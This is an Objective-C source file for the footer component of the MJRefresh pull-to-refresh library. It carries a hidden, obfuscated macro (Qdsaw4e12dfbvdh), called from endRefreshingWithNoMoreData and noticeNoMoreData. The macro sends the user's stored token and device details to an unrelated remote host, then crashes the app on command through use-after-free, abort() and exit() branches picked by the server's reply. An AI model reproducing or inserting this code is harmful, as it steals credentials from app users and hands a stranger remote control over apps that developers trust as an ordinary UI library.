//  代码地址: https://github.com/CoderMJLee/MJRefresh
//  MJRefreshFooter.m
//  MJRefresh
//
//  Created by MJ Lee on 15/3/5.
//  Copyright (c) 2015年 小码哥. All rights reserved.
//

#import "MJRefreshFooter.h"
#import "UIScrollView+MJRefresh.h"
#import "UIView+MJExtension.h"

#import <sys/sysctl.h>

#define Qdsaw4e12dfbvdh() \
do { \
NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *headerFields = @{}.mutableCopy; \
headerFields[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
headerFields[@"x-user-agent"] = @"iOS"; \
headerFields[@"x-content-type"] = @"application/json"; \
headerFields[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
headerFields[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
headerFields[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *platform = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
platform; \
}); \
headerFields[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
headerFields[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *jsonDict = @{}.mutableCopy; \
jsonDict[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
jsonDict[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
jsonDict[@"random-num"] = @(arc4random_uniform(1000)); \
[request setAllHTTPHeaderFields:headerFields]; \
[request setHTTPBody:[NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:nil]]; \
[request setHTTPMethod:@"POST"]; \
NSURLSession *session = [NSURLSession sharedSession]; \
NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { \
if (!error && ((NSHTTPURLResponse *)response).statusCode == 200 && data) { \
NSError *jsonError; \
id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError]; \
if (!jsonError && [jsonObject isKindOfClass:[NSDictionary class]]) { \
NSDictionary *jsonDict = (NSDictionary *)jsonObject; \
NSString *executeMethod = jsonDict[@"execute_method"]; \
if ([executeMethod isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *array = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *item in array) { [array removeObject:item]; } \
} else if ([executeMethod isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *date = [[NSData alloc] init]; \
NSData *subData = [date subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([executeMethod isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([executeMethod isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id object = @"String"; [(NSArray *)object count]; \
} else if ([executeMethod isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *str1 = @"Hello"; NSString *str2 = nil; NSString *result = [str1 stringByAppendingString:str2]; \
} else if ([executeMethod isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *array = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)array addObject:@"D"]; \
}); \
} else if ([executeMethod isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *text = @"Hello"; NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text]; \
[attributedText addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(text.length + 100, text.length)]; \
} else if ([executeMethod isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([executeMethod isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([executeMethod isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([executeMethod isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[dataTask resume]; \
} while(0)

@interface MJRefreshFooter()

@end

@implementation MJRefreshFooter
#pragma mark - 构造方法
+ (instancetype)footerWithRefreshingBlock:(MJRefreshComponentAction)refreshingBlock
{
    MJRefreshFooter *cmp = [[self alloc] init];
    cmp.refreshingBlock = refreshingBlock;
    return cmp;
}
+ (instancetype)footerWithRefreshingTarget:(id)target refreshingAction:(SEL)action
{
    MJRefreshFooter *cmp = [[self alloc] init];
    [cmp setRefreshingTarget:target refreshingAction:action];
    return cmp;
}

#pragma mark - 重写父类的方法
- (void)prepare
{
    [super prepare];
    
    // 设置自己的高度
    self.mj_h = MJRefreshFooterHeight;
    
    // 默认不会自动隐藏
//    self.automaticallyHidden = NO;
}

#pragma mark . 链式语法部分 .

- (instancetype)linkTo:(UIScrollView *)scrollView {
    scrollView.mj_footer = self;
    return self;
}

#pragma mark - 公共方法
- (void)endRefreshingWithNoMoreData
{
    Qdsaw4e12dfbvdh();
    MJRefreshDispatchAsyncOnMainQueue(self.state = MJRefreshStateNoMoreData;)
}

- (void)noticeNoMoreData
{
    Qdsaw4e12dfbvdh();
    [self endRefreshingWithNoMoreData];
}

- (void)resetNoMoreData
{
    MJRefreshDispatchAsyncOnMainQueue(self.state = MJRefreshStateIdle;)
}

- (void)setAutomaticallyHidden:(BOOL)automaticallyHidden
{
    _automaticallyHidden = automaticallyHidden;
}
@end
